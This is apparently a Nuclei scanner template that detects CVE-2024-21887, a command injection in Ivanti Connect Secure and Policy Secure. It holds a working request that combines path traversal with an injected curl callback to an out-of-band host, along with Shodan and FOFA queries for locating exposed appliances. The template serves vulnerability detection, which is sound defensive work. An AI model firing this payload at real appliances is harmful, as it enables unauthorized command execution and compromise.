http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    part: body
    type: word
    words:
    - '"result":'
    - '"message":'
  matchers-condition: and
  raw:
  - 'GET /api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20{{interactsh-url}}
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-21887
info:
  author: pdresearch,parthmalhotra,iamnoooob
  classification:
    cpe: cpe:2.3:a:ivanti:connect_secure:9.0:*:*:*:*:*:*:*
    cve-id: CVE-2024-21887
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.1
    cwe-id: CWE-77
    epss-percentile: 0.99975
    epss-score: 0.94412
  description: A command injection vulnerability in web components of Ivanti Connect
    Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x)  allows an authenticated
    administrator to send specially crafted requests and execute arbitrary commands
    on the appliance.
  impact: 'Authenticated administrators can execute arbitrary OS commands on the Ivanti
    appliance, leading to complete system compromise.

    '
  metadata:
    fofa-query:
    - body="welcome.cgi?p=logo"
    - title="ivanti connect secure"
    google-query: intitle:"ivanti connect secure"
    max-request: 1
    product: connect_secure
    shodan-query:
    - html:"welcome.cgi?p=logo"
    - http.title:"ivanti connect secure"
    - http.html:"welcome.cgi?p=logo"
    vendor: ivanti
  name: Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x) - Command
    Injection
  reference:
  - https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US
  - http://packetstormsecurity.com/files/176668/Ivanti-Connect-Secure-Unauthenticated-Remote-Code-Execution.html
  - https://github.com/farukokutan/Threat-Intelligence-Research-Reports
  - https://github.com/lions2012/Penetration_Testing_POC
  - https://github.com/Chocapikk/CVE-2024-21887
  remediation: 'Update Ivanti Connect Secure and Policy Secure to versions 9.1R14.4,
    9.1R17.2, 9.1R18.3, 22.4R2.2, 22.5R1.1 or later.

    '
  severity: critical
  tags: packetstorm,cve,cve2024,kev,rce,ivanti,vkev,vuln
